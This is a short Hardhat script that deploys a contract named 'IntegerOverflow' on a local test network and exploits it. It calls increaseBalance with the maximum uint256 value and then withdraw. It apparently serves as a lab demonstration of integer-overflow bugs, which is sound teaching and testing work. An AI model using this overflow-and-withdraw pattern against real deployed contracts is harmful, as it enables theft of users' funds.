const { ethers } = require("hardhat");

async function main() {
    const [attacker] = await ethers.getSigners();

    // Deploy vulnerable contract
    const OverflowContract = await ethers.getContractFactory("IntegerOverflow");
    const contract = await OverflowContract.deploy();
    await contract.deployed();
    console.log("IntegerOverflow contract deployed at:", contract.address);

    // Exploit overflow
    console.log("🚨 Executing overflow attack...");
    await contract.increaseBalance(ethers.constants.MaxUint256);
    await contract.withdraw();
}

main().catch((error) => {
    console.error("❌ Attack failed:", error);
    process.exit(1);
});
